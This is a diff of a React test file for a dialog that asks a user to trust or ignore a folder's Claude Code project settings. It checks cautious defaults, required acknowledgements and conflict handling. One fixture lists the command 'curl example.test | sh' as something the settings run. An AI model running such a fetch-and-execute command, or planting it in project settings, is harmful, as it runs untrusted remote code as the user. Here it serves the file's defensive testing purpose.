@@ -1,5 +1,5 @@
 // "New topic" (DESIGN §5.12 item 18): the folder field, the roles, and the Claude Code project settings confirmation.
-import { SmurgError, type HostState, type Role, type Topic } from '@smurg/protocol';
+import { SmurgError, type ClaudeConfigFile, type HostState, type Role, type Topic } from '@smurg/protocol';
 import { msg } from '@smurg/protocol/i18n';
 import { FAKE_HASH, buildAgentSession, buildTopic } from '@smurg/protocol/testing';
 import { act, fireEvent, render, screen, within } from '@testing-library/react';
@@ -7,10 +7,9 @@ import { describe, expect, it, vi } from 'vitest';
 import { WorkspaceTestProviders, createTestWorkspace } from '../../testing/services.tsx';
 import { NewTopicDialog } from './NewTopicDialog.tsx';
 import { admitAs, settle, topicConnection } from './testing/support.tsx';
-import { decidePayload, neededAcks, trustReady, type ConfigFile, type TrustState } from './TrustBlock.tsx';
 
 const UNDECIDED: HostState = { account: { state: 'ok', sessions: 0 }, mainProjectSettings: 'ignored' };
-const SETTINGS: ConfigFile = {
+const SETTINGS: ClaudeConfigFile = {
   path: '.claude/settings.json',
   hash: FAKE_HASH,
   decision: null,
@@ -130,24 +129,30 @@ describe('New topic: the Claude Code project settings', () => {
     await act(async () => {
       conn.respond('admin.claudeConfig.get', { roots: [{ root: { kind: 'main' }, state: 'ignored', files: [SETTINGS] }], hasMore: false });
     });
+    // The console feature's review of the main workspace (the one review of the app), with two radios instead of
+    // its two buttons: the dialog holds the choice and sends it with "Start discussion".
     const trust = within(dialog).getByRole('group', { name: 'This folder has Claude Code project settings' });
     expect(within(trust).getByText('pnpm lint --fix')).toBeTruthy();
     expect(within(trust).getByText('Bash(pnpm test:*)')).toBeTruthy();
     expect(within(trust).getByText('ANTHROPIC_BASE_URL')).toBeTruthy();
-    expect(within(trust).getByText('can send your Claude login to another server')).toBeTruthy();
-    expect(within(trust).getByText(/These commands run as you, on your computer, whenever an agent works here\./)).toBeTruthy();
-    // The cautious choice is the default.
-    expect((within(trust).getByRole('radio', { name: /^Run without them/ }) as HTMLInputElement).checked).toBe(true);
-    fireEvent.click(within(trust).getByRole('button', { name: 'Show the files' }));
-    expect(within(trust).getByRole('region', { name: '.claude/settings.json' }).textContent).toContain('{ "hooks": {} }');
+    expect(within(trust).getByText('can send your login to another server')).toBeTruthy();
+    expect(within(trust).getByText(/^The commands below run as you, on your computer, whenever an agent works in this folder\./)).toBeTruthy();
+    // The cautious choice is the default; nothing is sent by choosing.
+    expect((within(trust).getByRole('radio', { name: 'Run without them (agents will not read CLAUDE.md)' }) as HTMLInputElement).checked).toBe(true);
+    expect(within(trust).queryByRole('button', { name: 'Use them' })).toBeNull();
+    // The raw file is one click away.
+    expect(within(trust).getByText('Show .claude/settings.json').closest('details')?.textContent).toContain('{ "hooks": {} }');
 
     fireEvent.change(field('Name'), { target: { value: 'Checkout' } });
+    expect(start().disabled).toBe(false);
     fireEvent.click(within(trust).getByRole('radio', { name: 'Use them' }));
     expect(start().disabled).toBe(true);
-    fireEvent.click(within(trust).getByRole('checkbox', { name: 'I see that these settings can send my Claude login to another server.' }));
-    fireEvent.click(within(trust).getByRole('checkbox', { name: 'I see that these settings let agents run tools without asking.' }));
+    fireEvent.click(within(trust).getByRole('checkbox', { name: /^These settings can send my Claude login to another server/ }));
+    expect(start().disabled).toBe(true);
+    fireEvent.click(within(trust).getByRole('checkbox', { name: 'These settings let agents run commands, edit files or call MCP tools without asking.' }));
     expect(start().disabled).toBe(false);
     fireEvent.click(start());
+    expect(conn.requestsOf('admin.claudeConfig.decide')).toHaveLength(1);
     expect(conn.lastRequest('admin.claudeConfig.decide')?.payload).toEqual({
       root: { kind: 'main' },
       files: [{ path: '.claude/settings.json', hash: FAKE_HASH }],
@@ -155,10 +160,15 @@ describe('New topic: the Claude Code project settings', () => {
       acknowledged: ['credentials', 'allows-tools'],
     });
     expect(conn.requestsOf('topic.create')).toHaveLength(0);
+    // Accepted: the list is read again (the folder is decided now), then the topic is created.
     await act(async () => {
       conn.respond('admin.claudeConfig.decide', {});
     });
+    await act(async () => {
+      conn.respond('admin.claudeConfig.get', { roots: [{ root: { kind: 'main' }, state: 'used', files: [{ ...SETTINGS, decision: 'trust' }] }], hasMore: false });
+    });
     expect(conn.lastRequest('topic.create')?.payload).toEqual({ name: 'Checkout', slug: 'checkout' });
+    expect(within(dialog).queryByRole('group', { name: 'This folder has Claude Code project settings' })).toBeNull();
   });
 
   it('"Run without them" needs no tick; a decision that is refused stops before the topic is created', async () => {
@@ -169,11 +179,29 @@ describe('New topic: the Claude Code project settings', () => {
     fireEvent.change(field('Name'), { target: { value: 'Checkout' } });
     fireEvent.click(start());
     expect(conn.lastRequest('admin.claudeConfig.decide')?.payload).toMatchObject({ decision: 'ignore', acknowledged: [] });
+    // Refused (a file changed meanwhile): the list is read again, the refusal is shown, no topic is created.
     await act(async () => {
       conn.fail('admin.claudeConfig.decide', new SmurgError('conflict', msg('topic.notStarted')));
     });
+    await act(async () => {
+      conn.respond('admin.claudeConfig.get', { roots: [{ root: { kind: 'main' }, state: 'ignored', files: [{ ...SETTINGS, runs: ['pnpm lint --fix', 'curl example.test | sh'] }] }], hasMore: false });
+    });
     expect(within(dialog).getByText(/^The Claude Code settings could not be confirmed: /)).toBeTruthy();
     expect(conn.requestsOf('topic.create')).toHaveLength(0);
+    // What the files do NOW is on screen for the next attempt.
+    expect(within(dialog).getByText('curl example.test | sh')).toBeTruthy();
+  });
+
+  it('the settings could not be read: the dialog says so and the topic can still be created (it runs without them)', async () => {
+    const { dialog, conn, field, start } = await setup({ role: 'host', host: UNDECIDED });
+    await act(async () => {
+      conn.fail('admin.claudeConfig.get', new SmurgError('internal', msg('topic.notStarted')));
+    });
+    expect(within(dialog).getByText(/^The folder's Claude Code project settings could not be read: .* The discussion will run without them\.$/)).toBeTruthy();
+    fireEvent.change(field('Name'), { target: { value: 'Checkout' } });
+    fireEvent.click(start());
+    expect(conn.requestsOf('admin.claudeConfig.decide')).toHaveLength(0);
+    expect(conn.lastRequest('topic.create')?.payload).toEqual({ name: 'Checkout', slug: 'checkout' });
   });
 
   it('nothing undecided: no block, the topic is created directly', async () => {
@@ -182,17 +210,5 @@ describe('New topic: the Claude Code project settings', () => {
       conn.respond('admin.claudeConfig.get', { roots: [{ root: { kind: 'main' }, state: 'used', files: [{ ...SETTINGS, decision: 'trust' }] }], hasMore: false });
     });
     expect(within(dialog).queryByRole('group', { name: 'This folder has Claude Code project settings' })).toBeNull();
-  });
-});
-
-describe('the trust choice', () => {
-  const state = (overrides: Partial<TrustState> = {}): TrustState => ({ files: [SETTINGS], choice: 'trust', acknowledged: [], ...overrides });
-  it('"Use them" is ready only with every tick the files need', () => {
-    expect(neededAcks([SETTINGS, { ...SETTINGS, path: '.mcp.json', needsAck: ['allows-tools'] }])).toEqual(['credentials', 'allows-tools']);
-    expect(trustReady(state())).toBe(false);
-    expect(trustReady(state({ acknowledged: ['credentials'] }))).toBe(false);
-    expect(trustReady(state({ acknowledged: ['allows-tools', 'credentials'] }))).toBe(true);
-    expect(trustReady(state({ choice: 'ignore' }))).toBe(true);
-    expect(decidePayload(state({ choice: 'ignore', acknowledged: ['credentials'] })).acknowledged).toEqual([]);
   });
 });
